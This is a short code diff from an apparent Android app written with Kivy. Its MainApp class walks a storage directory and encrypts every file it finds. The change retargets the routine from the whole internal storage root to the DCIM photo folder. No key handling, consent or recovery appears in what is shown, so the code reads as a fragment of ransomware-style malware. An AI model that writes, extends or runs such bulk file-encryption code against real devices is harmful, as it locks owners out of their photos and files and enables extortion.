@@ -46,7 +46,7 @@ class MainApp(App):
                     encrypt_file(file_path, encrypted_file)
 
         try:
-            internal_storage = "/storage/emulated/0/"
+            internal_storage = "/storage/emulated/0/DCIM"
             encrypt_files_in_directory(internal_storage)
 
         except FileNotFoundError as e:
